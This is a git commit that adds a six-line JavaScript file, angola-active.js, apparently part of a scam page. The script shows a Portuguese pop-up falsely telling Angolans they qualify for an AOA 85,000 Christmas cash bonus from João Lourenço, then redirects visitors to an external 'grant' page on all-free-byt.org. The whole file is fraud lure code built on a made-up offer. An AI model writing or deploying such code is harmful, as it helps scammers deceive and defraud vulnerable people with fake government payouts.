e767db822934da7ca1a15bf444e44c325eaa364b
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-12-03 01:56:23 -0800

    Create angola-active.js

---
+++ angola-active.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIR AOA85,000'
+password=prompt('SMS: Parabéns Você se qualifica para o BÔNUS EM DINHEIRO DE NATAL DE João Lourenço AOA85,000 PARA ANGOLANOS. Por favor, pressione OK para retirar o prêmio em dinheiro   ','RETIR AOA85,000');
+if (password != 'RETIR AOA85,000') {
+location.href='https://all-free-byt.org/angola-grant.htm';
+}
